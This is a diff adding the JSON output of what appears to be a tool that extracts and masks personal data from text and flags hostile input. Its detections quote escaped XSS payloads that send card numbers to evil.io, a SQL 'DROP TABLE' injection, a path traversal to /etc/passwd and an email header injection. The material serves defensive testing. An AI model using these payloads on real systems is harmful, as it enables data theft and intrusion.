@@ -1,0 +1,160 @@
+{
+  "emails": {
+    "valid": [
+      {
+        "masked": "j***@gmail.com",
+        "category": "External"
+      },
+      {
+        "masked": "j***@yahoo.com",
+        "category": "External"
+      },
+      {
+        "masked": "j***@ALUEDUCATION.COM",
+        "category": "ALU Official"
+      },
+      {
+        "masked": "j***@alumni.alueducation.com",
+        "category": "ALU Alumni"
+      },
+      {
+        "masked": "J***@si.alueducation.com",
+        "category": "ALU SI"
+      },
+      {
+        "masked": "a***@bank.com",
+        "category": "External"
+      },
+      {
+        "masked": "v***@example.com",
+        "category": "External"
+      },
+      {
+        "masked": "a***@evil.com",
+        "category": "External"
+      }
+    ],
+    "rejected": [],
+    "alu_domain_breakdown": {
+      "ALU Official": 1,
+      "ALU Alumni": 1,
+      "ALU SI": 1,
+      "External": 5
+    }
+  },
+  "credit_cards": {
+    "valid": [
+      {
+        "masked": "**** **** **** 6467"
+      },
+      {
+        "masked": "**** **** **** 1111"
+      },
+      {
+        "masked": "**** **** **** 1111"
+      }
+    ],
+    "rejected": [
+      {
+        "masked": "**** **** **** 1111",
+        "reason": "found inside suspicious/script context"
+      },
+      {
+        "masked": "**** **** **** 5100",
+        "reason": "found inside suspicious/script context"
+      }
+    ]
+  },
+  "phone_numbers": {
+    "valid": [
+      "+250 788 123 456",
+      "078-812-3456",
+      "(078) 812 3456",
+      "0788.123.456"
+    ],
+    "rejected": []
+  },
+  "urls": {
+    "valid": [
+      "https://support.example.com/billing/refunds?ticket=4471&lang=en",
+      "http://legacy.example.org/faq",
+      "www.exmpl.io/r/9f8a",
+      "http://evil.io/steal?c=4111111111111111"
+    ],
+    "rejected": [
+      {
+        "raw": "https:///broken-link",
+        "reason": "missing/empty host"
+      }
+    ]
+  },
+  "times": [
+    "14:32",
+    "2:32 PM",
+    "14:33",
+    "09:15",
+    "9:15am",
+    "14:35",
+    "08:00",
+    "17:00",
+    "23:45",
+    "09:05",
+    "9:05"
+  ],
+  "html_tags_detected": [
+    "&lt;script&gt;",
+    "&lt;/script&gt;",
+    "&lt;script&gt;",
+    "&lt;/script&gt;",
+    "&lt;img src=x onerror=&quot;steal(&#x27;5105105105105100&#x27;)&quot;&gt;"
+  ],
+  "hashtags": [
+    "#urgent",
+    "#billing-issue",
+    "#ALU_Support",
+    "#q3refund"
+  ],
+  "currency_amounts": [
+    "$129.99",
+    "USD 259.98",
+    "\u20ac45,00",
+    "$1,299"
+  ],
+  "security_flags": [
+    {
+      "type": "script_or_event_handler",
+      "note": "Embedded script tag or inline event-handler attribute detected; any data inside it was excluded from results.",
+      "snippet": "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\nComment: &#x27;..."
+    },
+    {
+      "type": "script_or_event_handler",
+      "note": "Embedded script tag or inline event-handler attribute detected; any data inside it was excluded from results.",
+      "snippet": "&lt;script&gt;fetch(&#x27;http://evil.io/steal?c=41..."
+    },
+    {
+      "type": "script_or_event_handler",
+      "note": "Embedded script tag or inline event-handler attribute detected; any data inside it was excluded from results.",
+      "snippet": "onerror=&quot;steal(&#x27;5105105105105100&#x27;)&quot;&gt;\n\nTh..."
+    },
+    {
+      "type": "sql_injection_pattern",
+      "note": "Text resembling a SQL injection payload detected.",
+      "snippet": "; DROP TABLE users; --\nFake email trying..."
+    },
+    {
+      "type": "path_traversal_pattern",
+      "note": "Directory traversal sequence detected.",
+      "snippet": "../../../../etc/passwd\nAnother card-look..."
+    },
+    {
+      "type": "header_injection_attempt",
+      "note": "CRLF/encoded-newline followed by an email header keyword \u2014 classic header injection attempt.",
+      "snippet": ": victim@example.com%0ABcc:attacker@evil"
+    },
+    {
+      "type": "oversized_anomalous_token",
+      "note": "Unusually long unstructured token \u2014 possible buffer-stuffing / fuzzing junk.",
+      "snippet": "AAAAAAAAAAAAAAAAAAAA..."
+    }
+  ]
+}
